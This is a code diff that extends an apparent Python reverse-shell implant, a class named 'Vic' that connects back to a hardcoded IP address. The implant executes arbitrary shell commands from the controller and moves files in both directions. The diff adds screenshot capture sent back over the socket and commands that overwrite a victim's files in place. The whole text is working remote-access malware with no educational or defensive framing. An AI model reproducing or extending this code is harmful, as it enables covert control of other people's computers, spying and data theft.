@@ -1,8 +1,10 @@
 #!/usr/bin/python3
-import os
+import os,sys
 import subprocess
 import socket
 import time
+import base64
+import pyautogui
 
 class Vic():
     def __init__(self,ip,port):
@@ -22,6 +24,33 @@ class Vic():
             time.sleep(2)
             self.__connect__()
 
+
+    def simple_encrypt(self,f_name):
+            try:
+                f = open(f_name,"rb")
+                fde = base64.b64encode(f.read())
+                f.close()
+                os.remove(f_name)
+                f2 = open(f_name,"wb")
+                f2.write(fde)
+                f2.close()
+                self.s.send(b"[+]File Encrypted.")
+            except:
+                self.s.send(b"[-]File Error.")
+
+    def simple_decrypt(self,f_name):
+            try:
+                f = open(f_name,"rb")
+                fdd = base64.b64decode(f.read())
+                f.close()
+                os.remove(f_name)
+                f2 = open(f_name,"wb")
+                f2.write(fdd)
+                f2.close()
+                self.s.send(b"[+]File Decrypted.")
+            except:
+                self.s.send(b"[-]File Error.")
+
     def download_file(self,f_name):
         try:
             f = open(f_name,'wb')
@@ -37,7 +66,7 @@ class Vic():
                 break
         self.s.settimeout(None)
 
-
+    
     def upload_file(self,f_name):
         try:
             f = open(f_name,'rb')
@@ -48,10 +77,16 @@ class Vic():
             f = f.encode()
             self.s.send(f)
 
+    def screenShot(self,f_name):
+        myScreenshot = pyautogui.screenshot()
+        myScreenshot.save(f_name)
+        self.upload_file(f_name)
+        os.remove(f_name)
+        
     def __main__(self):
         
         while(1):
-            cmd = self.s.recv(100).decode()
+            cmd = self.s.recv(1024).decode()
             if(cmd[:2] == "cd"):
                 try:
                     os.chdir(cmd[3:])
@@ -63,11 +98,15 @@ class Vic():
 
             elif (cmd == "quit!"):
                     self.s.close()
-                    exit(0)
+                    sys.exit(0)
 
-            elif (cmd[:3] == "run"):
+            elif (cmd[:3] == "ss!"):
+                self.screenShot(cmd[4:])
+                
+
+            elif (cmd[:4] == "run!"):
                 try:
-                    prog = subprocess.Popen([cmd[4:]])
+                    prog = subprocess.Popen([cmd[5:]])
                     data = f"[+]Executed On {prog.pid}"
                     self.s.send(data.encode())
                 except:
@@ -80,13 +119,19 @@ class Vic():
                 except:
                     self.s.send(b"[-]Error.Process")
             
-            elif (cmd[:8] == "download"):
-                    self.upload_file(cmd[9:])
-                    continue
+            elif (cmd[:9] == "download!"):
+                    self.upload_file(cmd[10:])
+                    
 
-            elif (cmd[:6] == "upload"):
-                    self.download_file(cmd[7:])
-                    continue
+            elif (cmd[:7] == "upload!"):
+                    self.download_file(cmd[8:])
+                    
+
+            elif (cmd[:8] == "encrypt!"):
+                    self.simple_encrypt(cmd[9:])
+            
+            elif (cmd[:8] == "decrypt!"):
+                    self.simple_decrypt(cmd[9:])
 
             else:
                     execute = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
@@ -99,5 +144,4 @@ class Vic():
                 
                            
 
-
-Vic("192.168.1.5",8888)
+Vic("192.168.1.5",9799)
